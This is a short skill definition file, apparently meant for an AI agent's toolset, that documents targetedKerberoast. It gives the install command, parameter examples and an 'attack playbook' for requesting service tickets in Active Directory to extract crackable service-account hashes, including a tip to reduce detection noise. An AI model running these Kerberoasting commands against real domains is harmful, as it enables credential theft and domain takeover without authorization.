---
name: targetedkerberoast-ad
description: "targetedKerberoast performs precise Kerberoast attacks. Signals: AD attack, domain penetration, threads"
zh-signals: "targetedKerberoast: 精确 Kerberoast 攻击。信号:ad攻击,域渗透,线程。"
when-to-use: >-
  Use when you have domain credentials and want to perform a targeted
  Kerberoast attack to extract crackable service account hashes.
---

# targetedKerberoast

- Attack Category: C30 AD Domain Penetration and Domain Controller Attacks
- Upstream Repository: https://github.com/ShutdownRepo/targetedKerberoast
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
pip install git+https://github.com/ShutdownRepo/targetedKerberoast
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `targetedkerberoast -d corp.local -u svc -p pass -dc-ip 10.0.0.1` | Targeted Kerberoast |
| `-d d -u u -p p --dc-ip ip -t 20` | Threads |
| `-o out.txt` | Output |

## Attack Scenario Playbook

### Precise Kerberoast Attack

```bash
targetedkerberoast -d corp.local -u svc -p pass
# Only request RC4 tickets for high-value accounts to reduce noise
```

## Notes

By ShutdownRepo, a targeted Kerberoast instead of roasting the entire domain.
